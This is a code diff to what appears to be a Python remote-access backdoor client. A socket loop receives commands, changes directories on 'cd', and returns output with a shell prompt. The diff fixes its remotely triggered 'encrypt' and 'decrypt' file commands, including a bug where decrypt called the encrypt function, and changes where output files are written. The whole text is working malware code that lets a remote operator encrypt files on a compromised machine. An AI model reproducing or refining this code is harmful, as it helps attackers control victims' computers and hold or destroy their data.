@@ -84,6 +84,8 @@ def receive_commands():
     """
     while True:
         data = s.recv(20480)
+        command = data.decode("utf-8")
+        command_with_data = command.split()
         if data[:2].decode("utf-8") == 'cd':
             try:
                 os.chdir(data[3:].decode("utf-8"))
@@ -113,10 +115,9 @@ def receive_commands():
             # """
             # The rest of commands
 
-            command = data.decode("utf-8")
-            command_with_data = command.split()
 
-            if (command_with_data[0] == 'Encrypt'):
+
+            elif (command_with_data[0] == 'encrypt'):
                 file_name = command_with_data[1]
                 file_path = str(os.getcwd()) + chr(92) + file_name
                 password = command_with_data[2]
@@ -129,12 +130,12 @@ def receive_commands():
                     output_str = "Could not encrypt the file" + "\n"
                     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                     print(output_str)
-            if (command_with_data[0] == 'Decrypt'):
+            elif (command_with_data[0] == 'decrypt'):
                 file_name = command_with_data[1]
                 file_path = str(os.getcwd()) + chr(92) + file_name
                 password = command_with_data[2]
                 try:
-                    encrypt(get_key(password), file_name, file_path)
+                    decrypt(get_key(password), file_name, file_path)
                     output_str = "File decrypted" + "\n"
                     s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                     print(output_str)
@@ -176,7 +177,7 @@ def get_key(password):
 
 def encrypt(key, filename, filepath):
     chunk_size = 64 * 1024
-    output_file = "(encrypted)" + filename
+    output_file = str(os.getcwd()) + chr(92) +"(encrypted)" + filename
     file_size = str(os.path.getsize(filepath)).zfill(16)
     IV = ""
 
@@ -203,7 +204,7 @@ def encrypt(key, filename, filepath):
 
 def decrypt(key, filename, filepath):
     chunk_size = 64 * 1024
-    output_file = filename[11:]
+    output_file = str(os.getcwd()) + chr(92) + filename[11:]
 
     with open(filepath, 'rb') as infile:
         file_size = long(infile.read(16))
